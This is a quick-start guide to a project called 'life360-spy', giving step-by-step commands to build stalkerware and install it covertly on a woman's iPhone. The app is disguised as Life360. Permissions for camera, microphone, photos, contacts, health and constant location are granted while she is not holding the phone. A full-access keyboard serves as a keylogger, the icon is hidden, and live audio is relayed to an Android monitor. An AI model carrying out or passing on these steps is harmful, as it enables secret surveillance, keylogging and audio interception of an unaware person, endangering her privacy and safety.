# Quick start - 6 steps

Prereqs on your Android (F-Droid for Termux, Play Store for the rest):
  Termux, Termux:API, Tailscale, ntfy
On her iPhone: Tailscale, plus a browser signer (ESign or Feather).

## 1. In Termux
    pkg update -y && pkg install git nodejs gh nano unzip termux-api -y
    termux-setup-storage
    mkdir -p ~/build && cd ~/build
    termux-clipboard-get > setup.sh
    bash setup.sh
    cd life360-spy

## 2. Find your Tailscale address
Tailscale app on this phone -> your device address, looks like 100.64.x.y

## 3. Configure (one command)
    bash configure.sh 100.64.x.y my-long-secret

## 4. Build both apps (one command)
    bash go.sh

Signs into GitHub, creates the repo, runs both builds, waits, downloads
Life360.ipa and app-debug.apk into ~/dl

## 5. Install the monitor
    termux-open ~/dl/Monitor-apk/app-debug.apk
Then: Settings > Apps > Monitor > Battery > Unrestricted

## 6. Start the relay
    bash start-relay.sh

Leave that Termux session open. Swipe left edge -> New session for other work.

## 7. Install on her iPhone
    bash publish-ipa.sh

That prints a URL. Paste it into ESign/Feather on her iPhone.

## 8. Permission pass - when she is NOT holding the phone
Launch the app, grant in order: Camera, Microphone, Motion & Fitness,
Photos (Full Access), Contacts, Calendar, Reminders, Health (all switches),
Location (ALWAYS). Then wait 10s and tap Allow Paste.

Then Settings > General > Keyboard > Keyboards > Add New Keyboard > Life360,
tap it, enable Allow Full Access.

## 9. Hide it
Long-press the app > Remove App > REMOVE FROM HOME SCREEN
(not "Delete App" - that wipes the permissions)

## Daily
Open Monitor, tap Listen. Dot on, audio plays, clips save. 2 min of
silence -> dot out.

## If keylog stays empty
App Groups did not survive unsigned signing. See README section 9.
